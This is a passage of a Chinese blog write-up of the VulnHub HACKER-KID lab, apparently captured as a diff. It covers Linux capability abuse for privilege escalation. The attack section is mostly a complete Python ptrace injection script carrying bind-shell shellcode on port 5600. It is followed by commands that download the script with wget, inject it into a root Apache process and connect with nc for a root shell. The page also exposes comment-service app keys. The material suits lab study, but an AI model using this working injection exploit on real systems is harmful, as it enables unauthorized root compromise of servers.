+<td>CAP_SYS_TIME</td>
+<td>改系统时钟</td>
+<td>撞签名失效、日志时间混淆</td>
+</tr>
+<tr>
+<td>CAP_SYS_RESOURCE</td>
+<td>突破 ulimit</td>
+<td>无限 fork&#x2F;占内存</td>
+</tr>
+<tr>
+<td>CAP_KILL</td>
+<td>杀任意进程</td>
+<td>杀守护进程触发重启</td>
+</tr>
+<tr>
+<td>CAP_IPC_OWNER</td>
+<td>管任意共享内存&#x2F;消息队列</td>
+<td>读 IPC 密文</td>
+</tr>
+<tr>
+<td>CAP_MKNOD</td>
+<td>创设备文件</td>
+<td>手搓 <code>/dev/mem</code> 读物理内存</td>
+</tr>
+</tbody></table>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>查询哪些文件具有Capabilitie权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">-r 递归的查询</span><br><span class="line">2&gt;/dev/null 把报错丢掉</span><br></pre></td></tr></table></figure>
+
+<p>放上去发现报错，提示没有将<code>getcap</code>加入到环境里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null   指定完整的路径再次查询</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/56cd889f6c26c8845f614caa4a627d3b.png" alt="img"></p>
+<p>发现了python2设置了<code>ptrace</code>，根据上面的学习我们知道<code>ptrace</code>是具有任意进程（包括root进程）调试的能力的</p>
+<p>那我们下一步就是找活着的root进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aef | grep root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/4f432f94c5ba9a5a329677767a90f88d.png" alt="img"></p>
+<p>找到了很多我们选择利用阿帕奇（当然选其他进程也是可以的，但是需要这个进程的进程号不能太大且需要长期守护）</p>
+<p>这里解释一下为啥选阿帕奇这个root进程</p>
+<p>1.长期守护、root UID、无 seccomp（&#x2F;proc&#x2F;705&#x2F;status 无 Seccomp 字段）<br>2.动态链接（有 libc &amp; ld.so）→ 方便调用 dlopen<br>3.默认没开 PR_SET_DUMPABLE → 允许 ptrace attach</p>
+<p>ID号是884</p>
+<p><strong>ptrace 内存注入</strong></p>
+<p>接下来我们需要下载一个利用这个权限漏洞的现成的Python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span><br><span class="line"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"># Macros defined in &lt;sys/ptrace.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT   = 4</span><br><span class="line">PTRACE_GETREGS    = 12</span><br><span class="line">PTRACE_SETREGS    = 13</span><br><span class="line">PTRACE_ATTACH     = 16</span><br><span class="line">PTRACE_DETACH     = 17</span><br><span class="line"></span><br><span class="line"># Structure defined in &lt;sys/user.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><br><span class="line"></span><br><span class="line">class user_regs_struct(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (&quot;r15&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r14&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r13&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r12&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r11&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r10&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r9&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r8&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rcx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;orig_rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rip&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;cs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;eflags&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ss&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ds&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;es&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs&quot;, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">pid=int(sys.argv[1])</span><br><span class="line"></span><br><span class="line"># Define argument type and respone type.</span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"># Attach to the process</span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, None, None)</span><br><span class="line">registers=user_regs_struct()</span><br><span class="line"></span><br><span class="line"># Retrieve the value stored in registers</span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">print(&quot;Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">print(&quot;Injecting Shellcode at: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line"># Shell code copied from exploit db.</span><br><span class="line">shellcode=&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line"># Inject the shellcode into the running process byte by byte.</span><br><span class="line">for i in xrange(0,len(shellcode),4):</span><br><span class="line"></span><br><span class="line">  # Convert the byte to little endian.</span><br><span class="line">  shellcode_byte_int=int(shellcode[i:4+i].encode(&#x27;hex&#x27;),16)</span><br><span class="line">  shellcode_byte_little_endian=struct.pack(&quot;&lt;I&quot;, shellcode_byte_int).rstrip(&#x27;\x00&#x27;).encode(&#x27;hex&#x27;)</span><br><span class="line">  shellcode_byte=int(shellcode_byte_little_endian,16)</span><br><span class="line"></span><br><span class="line">  # Inject the byte.</span><br><span class="line">  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"></span><br><span class="line">print(&quot;Shellcode Injected!!&quot;)</span><br><span class="line"></span><br><span class="line"># Modify the instuction pointer</span><br><span class="line">registers.rip=registers.rip+2</span><br><span class="line"></span><br><span class="line"># Set the registers</span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">print(&quot;Final Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line"># Detach from the process.</span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, None, None)</span><br></pre></td></tr></table></figure>
+
+<p>“这个脚本就像‘远程遥控器’：先让 root 程序暂停，把一段‘自动连回你电脑并开 shell’的小程序贴到它脑子里，再让它继续跑——root 程序自己就变成你的 root Shell 了。”</p>
+<p>1.attach &#x3D; 按暂停键 →  root 进程不能动。<br>2.写 shellcode &#x3D; 把“开放 5600 端口 + 开 bash”的二进制指令贴进它脑袋。<br>3.改指针 &#x3D; 告诉它“从这条新指令继续跑”。</p>
+<p>首先先把这个脚本写在kali本地，然后Kali开启HTTP服务，允许靶机把我们刚写的脚本下载下来</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/b80ef386c79524bef7b278d0062bef2b.png" alt="img"></p>
+<p>靶机从Kali上下载下来刚刚的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.240.99/zz.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/cfa3274b06e46c2ae6b5796eade7e2de.png" alt="img"></p>
+<p>使用python2.7的<code>sys_ptrace</code>权限，将我们的进程注入脚本zz.py注入到刚才发现的以root权限运行的阿帕奇进程中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 zz.py 884</span><br></pre></td></tr></table></figure>
+
+<p><code>zz.py</code>把自己的后门进程注入到<code>root</code>的<code>apache</code>进程里面之后，它会在本机开启一个侦听端口<code>5600</code><br><code>ss -pantu | grep 5600</code>看一下是否开启了5600端口，如果开启了的话，说明我们的注入成功了，这个后门的进程注入已经被启动了</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/096d5af227c939cddf10309096105312.png" alt="img"></p>
+<p><code>nc 192.168.240.130 5600</code>，我们直接连接</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/87fdb6bca24ae054186e957c263c1be3.png" alt="img"></p>
+<p>成功提权</p>
+<p>**注入完成 → 靶机开放 5600 且已 root → Kali 连 5600 → 提权成功。</p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2025/10/31/vulnhub靶场HACKER-KID-1-0-1/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">DNS区域传输漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.3.</span> <span class="toc-text">收集页面信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">xxe漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">SSTI模板注入+反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%EF%BC%88Capabilitie%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">提权（Capabilitie）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Capabilitie"><span class="toc-number">1.2.1.</span> <span class="toc-text">Capabilitie</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Capabilitie%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Capabilitie是什么</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81Capabilitie%E6%9D%83%E9%99%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">常见Capabilitie权限</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80-%E6%8F%90%E6%9D%83%E7%88%B1%E8%80%83"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">一.提权爱考</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BA%8C-%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8"><span class="toc-number">1.2.1.2.2.</span> <span class="toc-text">二.渗透常用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2025/10/26/渗透测试工具kali/">渗透测试值工具kali</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2025/10/31/vulnhub靶场HACKER-KID-1-0-1/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hi~欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"第57次取消发送","artist":"不知名","url":"music/第57次取消发送.mp3","cover":"/imgs/cc.jpg"},{"name":"瞬","artist":"郑润泽","url":"music/瞬.mp3","cover":"/imgs/cc.jpg"},{"name":"想你时风起","artist":"单依纯","url":"music/想你时风起-单依纯.mp3","cover":"/imgs/cc.jpg"},{"name":"心许百年","artist":"c","url":"music/心许百年.mp3","cover":"/imgs/cc.jpg"},{"name":"🐟","artist":"鱼仔","url":"music/鱼仔.mp3","cover":"/imgs/cc.jpg"},{"name":"致你","artist":"王赫野","url":"music/致你！王赫野.mp3","cover":"/imgs/cc.jpg"},{"name":"沉溺","artist":"真源","url":"music/沉溺.mp3","cover":"/imgs/cc.jpg"},{"name":"无尽的冒险","artist":"时团","url":"music/无尽的冒险.mp3","cover":"/imgs/cc.jpg"},{"name":"想自由","artist":"王安宇","url":"music/王安宇.mp3","cover":"/imgs/cc.jpg"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
